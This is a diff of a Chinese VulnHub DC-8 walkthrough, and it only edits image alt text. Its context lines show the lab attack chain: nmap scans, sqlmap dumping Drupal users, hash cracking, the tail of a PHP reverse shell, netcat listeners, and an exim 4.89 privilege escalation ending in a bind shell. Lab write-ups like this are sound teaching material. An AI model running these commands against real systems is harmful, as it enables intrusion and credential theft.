@@ -48,7 +48,7 @@ For beginners, Google can be of great assistance, but you can always tweet me at
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.141` 就是目标了
 
@@ -57,11 +57,11 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.141
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/2.png)
 
 开放了 SSH 和 WEB 服务,从 WEB 开始,发现是个 Drupal 7,想到 DC1 的几个漏洞,尝试一下
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/3.png)
 
 ---
 
@@ -81,7 +81,7 @@ run
 
 点击左侧链接,出现 nid 参数,这个参数貌似可以注入
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/4.png)
 
 SQLMAP 走起
 ```
@@ -90,9 +90,9 @@ sqlmap -u http://192.168.141.141/?nid=1 -D d7db --tables --batch
 sqlmap -u http://192.168.141.141/?nid=1 -D d7db -T users --dump --batch
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/5.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/6.png)
 
 ```
 admin 	$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
@@ -107,7 +107,7 @@ echo "\$S\$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF" >> pass.txt
 hashcat -m 7900 -a 0 pass.txt /usr/share/john/password.lst
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/7.png)
 
 只跑出 john 的密码 turtle,那先用这个账号登录
 
@@ -117,7 +117,7 @@ hashcat -m 7900 -a 0 pass.txt /usr/share/john/password.lst
 
 登陆后发现有一处直接执行 php 代码的地方
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/8.png)
 
 是个表单设置,可能要用 Contact us 触发
 
@@ -244,16 +244,16 @@ function printit ($string) {
 ?>
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/9.png)
 
 kali 监听
 ```
 nc -nlvp 4444
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/10.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/11.png)
 
 ---
 
@@ -265,7 +265,7 @@ python -c "import pty;pty.spawn('/bin/bash')"
 find / -perm -u=s 2>/dev/null
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/12.png)
 
 挨个找过去,在 exim4 里发现几个漏洞
 ```
@@ -273,7 +273,7 @@ exim4 --version
 searchsploit -w exim 4.89
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/13.png)
 
 DOS 和命令执行先 pass,测一下提权 https://www.exploit-db.com/exploits/46996
 
@@ -368,14 +368,14 @@ bash pri.sh -m netcat
 
 耐心等待
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/14.png)
 
 这个时候再用 kali 新建一个 bind shell 连接
 ```
 nc -nv 192.168.141.141 31337
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/15.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC8/15.png)
 
 提权成功,感谢靶机作者 @DCUA7
 
